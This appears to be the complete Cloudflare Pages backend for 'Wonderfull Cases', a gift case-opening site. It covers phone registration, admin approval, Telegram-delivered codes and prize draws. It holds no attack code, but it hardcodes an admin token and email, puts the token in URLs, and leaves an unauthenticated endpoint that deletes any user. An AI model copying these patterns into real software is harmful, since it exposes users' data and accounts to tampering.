// ============================================================
//  Wonderfull Cases — вся серверная логика (Cloudflare Pages)
//  Собрано из файлов проекта: index.js, cases.js, register.js,
//  step.js, [id].js + восстановлены недостающие модули
//  (регистрация, статус, админ-панель, одобрение заявок).
// ============================================================

// ---------- НАСТРОЙКИ ----------
const ADMIN_EMAIL = 'Vucoole@hotmail.com';
// Секретный токен админки. Поменяй на свой при желании:
const ADMIN_TOKEN = 'wc_31ca9d7188ee4be0da25';

// ---------- ДАННЫЕ КЕЙСОВ ----------
const CASES = [
  { id:'starter', name:'Starter Case', price:100, color:'#6c5ce7', gradient:'linear-gradient(135deg,#6c5ce7,#a29bfe)', desc:'Первый шаг к коллекции',
    pool:[{name:'Cookie Heart',emoji:'🍪',rarity:'common'},{name:'Lol Pop',emoji:'🍭',rarity:'common'},{name:'Bunny Muffin',emoji:'🧁',rarity:'common'},{name:'Star Notepad',emoji:'📓',rarity:'uncommon'},{name:'Perfume Bottle',emoji:'🧴',rarity:'uncommon'},{name:'Toy Bear',emoji:'🧸',rarity:'rare'}] },
  { id:'premium', name:'Premium Case', price:500, color:'#00cec9', gradient:'linear-gradient(135deg,#00cec9,#55efc4)', desc:'Шанс на редкие подарки',
    pool:[{name:'Swiss Watch',emoji:'⌚',rarity:'uncommon'},{name:'Record Player',emoji:'📻',rarity:'uncommon'},{name:'Precious Peach',emoji:'🍑',rarity:'rare'},{name:'Genie Lamp',emoji:'🧞',rarity:'rare'},{name:'Jelly Bunny',emoji:'🐰',rarity:'rare'},{name:'Spiced Wine',emoji:'🍷',rarity:'epic'}] },
  { id:'legendary', name:'Legendary Case', price:2000, color:'#fdcb6e', gradient:'linear-gradient(135deg,#fdcb6e,#e17055)', desc:'Легендарные награды',
    pool:[{name:"Durov's Cap",emoji:'🧢',rarity:'epic'},{name:'Vintage Cigar',emoji:'🚬',rarity:'epic'},{name:'Lunar Snake',emoji:'🐍',rarity:'epic'},{name:'Eternal Rose',emoji:'🌹',rarity:'legendary'},{name:'Diamond Ring',emoji:'💍',rarity:'legendary'},{name:'Plush Pepe',emoji:'🐸',rarity:'mythic'}] },
  { id:'holiday', name:'Holiday Case', price:300, color:'#e84393', gradient:'linear-gradient(135deg,#e84393,#fd79a8)', desc:'Праздничное настроение',
    pool:[{name:'Santa Hat',emoji:'🎅',rarity:'common'},{name:'Jingle Bells',emoji:'🔔',rarity:'common'},{name:'Snow Globe',emoji:'⛄',rarity:'uncommon'},{name:'Gingerbread Man',emoji:'🍪',rarity:'uncommon'},{name:'Hot Cocoa',emoji:'☕',rarity:'rare'},{name:'Christmas Tree',emoji:'🎄',rarity:'epic'}] },
  { id:'mystery', name:'Mystery Case', price:800, color:'#a29bfe', gradient:'linear-gradient(135deg,#a29bfe,#6c5ce7)', desc:'Случайный подарок из всех', pool:null },
  { id:'neon', name:'Neon Case', price:600, color:'#ff00ff', gradient:'linear-gradient(135deg,#ff00ff,#00ffff)', desc:'Неоновые подарки',
    pool:[{name:'Neon Star',emoji:'🌟',rarity:'common'},{name:'Lightning Bolt',emoji:'⚡',rarity:'uncommon'},{name:'Crystal Ball',emoji:'🔮',rarity:'rare'},{name:'Rainbow',emoji:'🌈',rarity:'epic'},{name:'Comet',emoji:'💫',rarity:'legendary'},{name:'Galaxy',emoji:'🌌',rarity:'mythic'}] },
  { id:'galaxy', name:'Galaxy Case', price:1200, color:'#1a1a4e', gradient:'linear-gradient(135deg,#1a1a4e,#4a00e0)', desc:'Космические награды',
    pool:[{name:'Rocket',emoji:'🚀',rarity:'common'},{name:'Planet',emoji:'🪐',rarity:'uncommon'},{name:'Moon',emoji:'🌙',rarity:'rare'},{name:'Sun',emoji:'☀️',rarity:'epic'},{name:'Shooting Star',emoji:'🌠',rarity:'legendary'},{name:'Black Hole',emoji:'🕳️',rarity:'mythic'}] },
  { id:'cyber', name:'Cyber Case', price:900, color:'#00ff41', gradient:'linear-gradient(135deg,#00ff41,#008f11)', desc:'Киберпанк стиль',
    pool:[{name:'Gamepad',emoji:'🎮',rarity:'common'},{name:'Joystick',emoji:'🕹️',rarity:'uncommon'},{name:'Headphones',emoji:'🎧',rarity:'rare'},{name:'Laptop',emoji:'💻',rarity:'epic'},{name:'Robot',emoji:'🤖',rarity:'legendary'},{name:'Alien',emoji:'👽',rarity:'mythic'}] },
  { id:'royal', name:'Royal Case', price:2500, color:'#ffd700', gradient:'linear-gradient(135deg,#ffd700,#b8860b)', desc:'Королевские сокровища',
    pool:[{name:'Crown',emoji:'👑',rarity:'uncommon'},{name:'Scepter',emoji:'🪄',rarity:'rare'},{name:'Throne',emoji:'👑',rarity:'epic'},{name:'Royal Ring',emoji:'💍',rarity:'legendary'},{name:'Golden Chalice',emoji:'🏆',rarity:'legendary'},{name:'Imperial Egg',emoji:'🥚',rarity:'mythic'}] },
  { id:'ocean', name:'Ocean Case', price:450, color:'#0077be', gradient:'linear-gradient(135deg,#0077be,#00c9ff)', desc:'Морские глубины',
    pool:[{name:'Wave',emoji:'🌊',rarity:'common'},{name:'Dolphin',emoji:'🐬',rarity:'uncommon'},{name:'Shark',emoji:'🦈',rarity:'rare'},{name:'Whale',emoji:'🐋',rarity:'epic'},{name:'Mermaid',emoji:'🧜',rarity:'legendary'},{name:'Kraken',emoji:'🐙',rarity:'mythic'}] },
  { id:'fire', name:'Fire Case', price:700, color:'#ff4500', gradient:'linear-gradient(135deg,#ff4500,#ff8c00)', desc:'Огненная мощь',
    pool:[{name:'Flame',emoji:'🔥',rarity:'common'},{name:'Match',emoji:'🧯',rarity:'uncommon'},{name:'Campfire',emoji:'🔥',rarity:'rare'},{name:'Volcano',emoji:'🌋',rarity:'epic'},{name:'Phoenix',emoji:'🦅',rarity:'legendary'},{name:'Dragon',emoji:'🐉',rarity:'mythic'}] },
  { id:'ice', name:'Ice Case', price:550, color:'#00bfff', gradient:'linear-gradient(135deg,#00bfff,#e0ffff)', desc:'Ледяное спокойствие',
    pool:[{name:'Snowflake',emoji:'❄️',rarity:'common'},{name:'Ice Cube',emoji:'🧊',rarity:'uncommon'},{name:'Snowman',emoji:'⛄',rarity:'rare'},{name:'Avalanche',emoji:'🏔️',rarity:'epic'},{name:'Frost Giant',emoji:'🧊',rarity:'legendary'},{name:'Yeti',emoji:'❄️',rarity:'mythic'}] },
  { id:'shadow', name:'Shadow Case', price:1100, color:'#2c2c54', gradient:'linear-gradient(135deg,#2c2c54,#706fd3)', desc:'Тени и мистика',
    pool:[{name:'Ghost',emoji:'👻',rarity:'common'},{name:'Bat',emoji:'🦇',rarity:'uncommon'},{name:'Spider',emoji:'🕷️',rarity:'rare'},{name:'Vampire',emoji:'🧛',rarity:'epic'},{name:'Witch',emoji:'🧙',rarity:'legendary'},{name:'Demon',emoji:'😈',rarity:'mythic'}] },
  { id:'rainbow', name:'Rainbow Case', price:1500, color:'#ff69b4', gradient:'linear-gradient(135deg,#ff69b4,#ffd700,#00ff00,#00bfff,#8a2be2)', desc:'Все цвета радуги',
    pool:[{name:'Heart',emoji:'❤️',rarity:'common'},{name:'Orange',emoji:'🧡',rarity:'uncommon'},{name:'Sun',emoji:'💛',rarity:'rare'},{name:'Leaf',emoji:'💚',rarity:'epic'},{name:'Diamond',emoji:'💙',rarity:'legendary'},{name:'Unicorn',emoji:'🦄',rarity:'mythic'}] },
];
const _all = CASES.filter(c=>c.pool).flatMap(c=>c.pool);
CASES.find(c=>c.id==='mystery').pool = _all;

// ---------- ХЕЛПЕРЫ ----------
function getCase(id){ return CASES.find(c=>c.id===id); }
function pubCase(c){ return { id:c.id, name:c.name, price:c.price, color:c.color, gradient:c.gradient, desc:c.desc, items:c.pool.length }; }
function uuid(){ return crypto.randomUUID(); }
function json(d,s=200){ return new Response(JSON.stringify(d), {status:s, headers:{'Content-Type':'application/json','Cache-Control':'no-store'}}); }
function pubUser(u){ return { id:u.id, phone:u.phone, status:u.status, step:u.step, code_verified:!!u.code_verified, created_at:u.created_at }; }
function html(page){ return new Response(page, {headers:{'Content-Type':'text/html; charset=utf-8'}}); }
function esc(s){ return String(s).replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
function checkToken(url){ return url.searchParams.get('token') === ADMIN_TOKEN; }

// ---------- МАРШРУТИЗАТОР ----------
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;
    try {
      // --- API ---
      if (path === '/api/register' && method === 'POST') return await handleRegister(request, env, url);
      if (path === '/api/cases' && method === 'GET') return handleCases();
      if (path === '/api/verify-code' && method === 'POST') return await handleVerifyCode(request, env);
      if (path === '/api/open-case' && method === 'POST') return await handleOpenCase(request, env);
      if (path === '/api/reset' && method === 'POST') return await handleReset(request, env);

      let m = path.match(/^\/api\/status\/([0-9a-fA-F-]+)$/);
      if (m && method === 'GET') return await handleStatus(m[1], env);

      m = path.match(/^\/api\/inventory\/([0-9a-fA-F-]+)$/);
      if (m && method === 'GET') return await handleInventory(m[1], env);

      // --- Админка ---
      if (path === '/admin') return await handleAdminPage(url, env);

      m = path.match(/^\/admin\/sendcode\/([0-9a-fA-F-]+)$/);
      if (m) return await handleSendCode(m[1], url, env);

      m = path.match(/^\/admin\/approve\/([0-9a-fA-F-]+)\/(step1|step2)$/);
      if (m) return await handleApprove(m[1], m[2], url, env);

      m = path.match(/^\/admin\/delete\/([0-9a-fA-F-]+)$/);
      if (m) return await handleAdminDelete(m[1], url, env);

      // --- Статика (index.html и пр.) ---
      return env.ASSETS.fetch(request);
    } catch (e) {
      return json({ error: 'Внутренняя ошибка сервера' }, 500);
    }
  }
};

// ---------- РЕГИСТРАЦИЯ (восстановлено по исходному коду) ----------
async function handleRegister(request, env, url) {
  const body = await request.json().catch(()=>({}));
  const phone = String(body.phone||'').replace(/\s/g,'');
  if (!phone || !/^\+?\d{6,15}$/.test(phone)) {
    return json({ error:'Введите корректный номер телефона' }, 400);
  }
  const db = env.DB;
  let user = await db.prepare('SELECT * FROM users WHERE phone = ?').bind(phone).first();
  if (!user) {
    const id = uuid();
    const now = new Date().toISOString();
    await db.prepare('INSERT INTO users (id,phone,status,step,created_at,updated_at) VALUES (?,?,?,?,?,?)')
      .bind(id, phone, 'pending', 1, now, now).run();
    user = await db.prepare('SELECT * FROM users WHERE id = ?').bind(id).first();
  }
  const origin = url.origin;
  const approve1 = `${origin}/admin/approve/${user.id}/step1?token=${ADMIN_TOKEN}`;
  const approve2 = `${origin}/admin/approve/${user.id}/step2?token=${ADMIN_TOKEN}`;
  const sendCode = `${origin}/admin/sendcode/${user.id}?token=${ADMIN_TOKEN}`;
  const emailBody = `Новая заявка Wonderfull Cases\nТелефон: ${phone}\nID: ${user.id}\n\nОдобрить шаг1: ${approve1}\nОтправить код: ${sendCode}\nПодтвердить шаг2: ${approve2}`;
  await db.prepare('INSERT INTO email_log (id,to_email,subject,body,created_at) VALUES (?,?,?,?,?)')
    .bind(uuid(), ADMIN_EMAIL, `Новая регистрация: ${phone}`, emailBody, new Date().toISOString()).run();
  // Примечание: отправка писем через MailChannels больше не работает (сервис закрыл
  // бесплатный доступ) — все заявки сохраняются в базе и видны в админке /admin.
  return json({ ok:true, user: pubUser(user) });
}

// ---------- СПИСОК КЕЙСОВ ----------
function handleCases() {
  return json({ cases: CASES.map(pubCase) });
}

// ---------- СТАТУС ПОЛЬЗОВАТЕЛЯ (восстановлено) ----------
async function handleStatus(id, env) {
  const user = await env.DB.prepare('SELECT * FROM users WHERE id = ?').bind(id).first();
  if (!user) return json({ error:'not found' }, 404);
  return json({ user: pubUser(user) });
}

// ---------- ПРОВЕРКА КОДА ----------
async function handleVerifyCode(request, env) {
  const body = await request.json().catch(()=>({}));
  const { userId, code } = body;
  const db = env.DB;
  const user = await db.prepare('SELECT * FROM users WHERE id = ?').bind(userId).first();
  if (!user) return json({ error:'not found' }, 404);
  if (user.status !== 'code_sent' && user.step < 3) return json({ error:'Код ещё не отправлен администратором' }, 400);
  if (!user.code) return json({ error:'Код не задан' }, 400);
  if (String(code).trim() !== String(user.code).trim()) return json({ error:'Неверный код' }, 400);
  const now = new Date().toISOString();
  await db.prepare('UPDATE users SET code_verified=1, step=4, status=?, updated_at=? WHERE id=?')
    .bind('code_verified', now, userId).run();
  const updated = await db.prepare('SELECT * FROM users WHERE id = ?').bind(userId).first();
  return json({ ok:true, user: pubUser(updated) });
}

// ---------- ОТКРЫТИЕ КЕЙСА ----------
async function handleOpenCase(request, env) {
  const body = await request.json().catch(()=>({}));
  const { userId, caseId } = body;
  const db = env.DB;
  const user = await db.prepare('SELECT * FROM users WHERE id = ?').bind(userId).first();
  if (!user || user.status !== 'active') return json({ error:'Аккаунт не активирован' }, 403);
  const c = getCase(caseId);
  if (!c) return json({ error:'Кейс не найден' }, 404);
  const prize = c.pool[Math.floor(Math.random()*c.pool.length)];
  const now = new Date().toISOString();
  await db.prepare('INSERT INTO openings (id,user_id,case_id,prize_name,prize_emoji,prize_rarity,opened_at) VALUES (?,?,?,?,?,?,?)')
    .bind(uuid(), userId, caseId, prize.name, prize.emoji, prize.rarity, now).run();
  return json({ ok:true, prize });
}

// ---------- ИНВЕНТАРЬ ----------
async function handleInventory(id, env) {
  const { results } = await env.DB.prepare('SELECT * FROM openings WHERE user_id = ? ORDER BY opened_at DESC').bind(id).all();
  return json({ items: results || [] });
}

// ---------- СБРОС (удаление пользователя) ----------
async function handleReset(request, env) {
  const body = await request.json().catch(()=>({}));
  const { userId, phone } = body;
  const db = env.DB;
  if (userId) {
    await db.prepare('DELETE FROM openings WHERE user_id = ?').bind(userId).run();
    await db.prepare('DELETE FROM users WHERE id = ?').bind(userId).run();
  } else if (phone) {
    const u = await db.prepare('SELECT id FROM users WHERE phone = ?').bind(phone).first();
    if (u) {
      await db.prepare('DELETE FROM openings WHERE user_id = ?').bind(u.id).run();
      await db.prepare('DELETE FROM users WHERE id = ?').bind(u.id).run();
    }
  }
  return json({ ok:true });
}

// ---------- АДМИН-ПАНЕЛЬ (восстановлено) ----------
const STATUS_LABELS = {
  pending: '⏳ ожидает одобрения',
  approved_step1: '✅ одобрен — нужен код',
  code_sent: '🔑 код отправлен',
  code_verified: '🔓 код принят — ждёт активации',
  active: '🟢 активен',
};

async function handleAdminPage(url, env) {
  if (!checkToken(url)) return new Response('Forbidden', {status:403});
  const { results } = await env.DB.prepare('SELECT * FROM users ORDER BY created_at DESC').all();
  const users = results || [];
  const rows = users.map(u => {
    const badge = STATUS_LABELS[u.status] || u.status;
    let actions = '';
    if (u.status === 'pending') {
      actions += `<a class="btn ok" href="/admin/approve/${u.id}/step1?token=${ADMIN_TOKEN}">✅ Одобрить</a> `;
    }
    if (u.status === 'approved_step1') {
      actions += `<a class="btn" href="/admin/sendcode/${u.id}?token=${ADMIN_TOKEN}">🔑 Сгенерировать код</a> `;
    }
    if (u.status === 'code_sent') {
      actions += `<span class="code">код: ${esc(u.code || '')}</span> <a class="btn" href="/admin/sendcode/${u.id}?token=${ADMIN_TOKEN}">🔄 Новый</a> `;
    }
    if (u.status === 'code_verified') {
      actions += `<a class="btn ok" href="/admin/approve/${u.id}/step2?token=${ADMIN_TOKEN}">🔓 Активировать</a> `;
    }
    actions += `<a class="btn del" href="/admin/delete/${u.id}?token=${ADMIN_TOKEN}" onclick="return confirm('Удалить пользователя?')">🗑</a>`;
    return `<tr><td>${esc(u.phone)}</td><td><span class="badge b-${esc(u.status)}">${badge}</span><div class="date">${esc(u.created_at || '')}</div></td><td class="actions">${actions}</td></tr>`;
  }).join('');
  return html(`<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wonderfull Cases — Админка</title><style>
    body{background:#0f0f1a;color:#fff;font-family:Arial,sans-serif;padding:24px;margin:0}
    h1{font-size:22px;margin:0 0 6px} p.hint{color:#9a9ab0;font-size:13px;margin:0 0 20px}
    table{width:100%;border-collapse:collapse;background:#1a1a2e;border-radius:12px;overflow:hidden}
    th{background:#22223a;color:#9a9ab0;font-size:12px;text-transform:uppercase;padding:10px 12px;text-align:left}
    td{padding:12px;border-top:1px solid rgba(255,255,255,.06);font-size:14px;vertical-align:top}
    .badge{display:inline-block;padding:4px 10px;border-radius:999px;font-size:12px;background:rgba(108,92,231,.15);border:1px solid rgba(108,92,231,.4);color:#a29bfe}
    .b-active{background:rgba(0,206,201,.15);border-color:rgba(0,206,201,.4);color:#55efc4}
    .b-code_sent{background:rgba(41,128,185,.2);border-color:rgba(41,128,185,.5);color:#74b9ff}
    .b-code_verified{background:rgba(253,203,110,.15);border-color:rgba(253,203,110,.4);color:#fdcb6e}
    .date{color:#666;font-size:11px;margin-top:4px}
    .btn{display:inline-block;padding:7px 12px;border-radius:8px;background:#2d2d4a;color:#fff;text-decoration:none;font-size:12px;margin:2px 2px 2px 0}
    .btn.ok{background:linear-gradient(135deg,#00b894,#00cec9)}
    .btn.del{background:#2d132c;color:#ff7675;border:1px solid #6c2020}
    .code{font-family:monospace;font-size:15px;color:#fdcb6e;font-weight:700}
    .empty{color:#9a9ab0;padding:24px;text-align:center}
  </style></head><body>
    <h1>🎁 Wonderfull Cases — панель администратора</h1>
    <p class="hint">Новые заявки появляются в этой таблице (письма на почту не отправляются — проверяйте страницу). Всего пользователей: ${users.length}</p>
    ${users.length ? `<table><tr><th>Телефон</th><th>Статус</th><th>Действия</th></tr>${rows}</table>` : '<div class="empty">Пока никто не зарегистрировался 🤷</div>'}
  </body></html>`);
}

// ---------- ГЕНЕРАЦИЯ КОДА (исходный код) ----------
async function handleSendCode(id, url, env) {
  if (!checkToken(url)) return new Response('Forbidden', {status:403});
  const db = env.DB;
  const user = await db.prepare('SELECT * FROM users WHERE id = ?').bind(id).first();
  if (!user) return new Response('User not found', {status:404});
  const code = String(Math.floor(100000 + Math.random()*900000));
  const now = new Date().toISOString();
  await db.prepare('UPDATE users SET code=?, status=?, step=3, updated_at=? WHERE id=?')
    .bind(code, 'code_sent', now, id).run();
  const html2 = `<html><body style="background:#0f0f1a;color:#fff;font-family:Arial;text-align:center;padding:60px;">
    <h2 style="color:#fdcb6e;">🔑 Код сгенерирован</h2>
    <p>Пользователь: ${esc(user.phone)}</p>
    <div style="font-size:48px;font-weight:bold;letter-spacing:8px;margin:24px 0;color:#fff;background:#1a1a2e;padding:20px;border-radius:12px;display:inline-block;">${code}</div>
    <p>Отправьте этот код пользователю в Telegram.</p>
    <p>Когда пользователь введёт код, нажмите:</p>
    <a href="/admin/approve/${user.id}/step2?token=${ADMIN_TOKEN}" style="display:inline-block;padding:12px 24px;background:#00cec9;color:#fff;text-decoration:none;border-radius:8px;">🔓 Подтвердить аккаунт (шаг 2)</a>
    <br><br><a href="/admin?token=${ADMIN_TOKEN}" style="color:#a29bfe;">← Назад</a></body></html>`;
  return html(html2);
}

// ---------- ОДОБРЕНИЕ (восстановлено) ----------
async function handleApprove(id, step, url, env) {
  if (!checkToken(url)) return new Response('Forbidden', {status:403});
  const db = env.DB;
  const user = await db.prepare('SELECT * FROM users WHERE id = ?').bind(id).first();
  if (!user) return new Response('User not found', {status:404});
  const now = new Date().toISOString();
  let title, text;
  if (step === 'step1') {
    await db.prepare('UPDATE users SET status=?, step=2, updated_at=? WHERE id=?')
      .bind('approved_step1', now, id).run();
    title = '✅ Заявка одобрена (шаг 1)';
    text = 'Теперь сгенерируйте код и отправьте его пользователю в Telegram:';
  } else {
    await db.prepare('UPDATE users SET status=?, step=5, updated_at=? WHERE id=?')
      .bind('active', now, id).run();
    title = '🔓 Аккаунт активирован';
    text = 'Пользователь теперь может открывать кейсы. Он увидит это на своём экране.';
  }
  const page = `<html><body style="background:#0f0f1a;color:#fff;font-family:Arial;text-align:center;padding:60px;">
    <h2 style="color:#00cec9;">${title}</h2>
    <p>Пользователь: ${esc(user.phone)}</p>
    <p>${text}</p>
    ${step === 'step1' ? `<a href="/admin/sendcode/${user.id}?token=${ADMIN_TOKEN}" style="display:inline-block;padding:12px 24px;background:#6c5ce7;color:#fff;text-decoration:none;border-radius:8px;">🔑 Сгенерировать код</a>` : ''}
    <br><br><a href="/admin?token=${ADMIN_TOKEN}" style="color:#a29bfe;">← Назад в админку</a></body></html>`;
  return html(page);
}

// ---------- УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ (админ) ----------
async function handleAdminDelete(id, url, env) {
  if (!checkToken(url)) return new Response('Forbidden', {status:403});
  const db = env.DB;
  await db.prepare('DELETE FROM openings WHERE user_id = ?').bind(id).run();
  await db.prepare('DELETE FROM users WHERE id = ?').bind(id).run();
  return Response.redirect(url.origin + '/admin?token=' + ADMIN_TOKEN, 302);
}
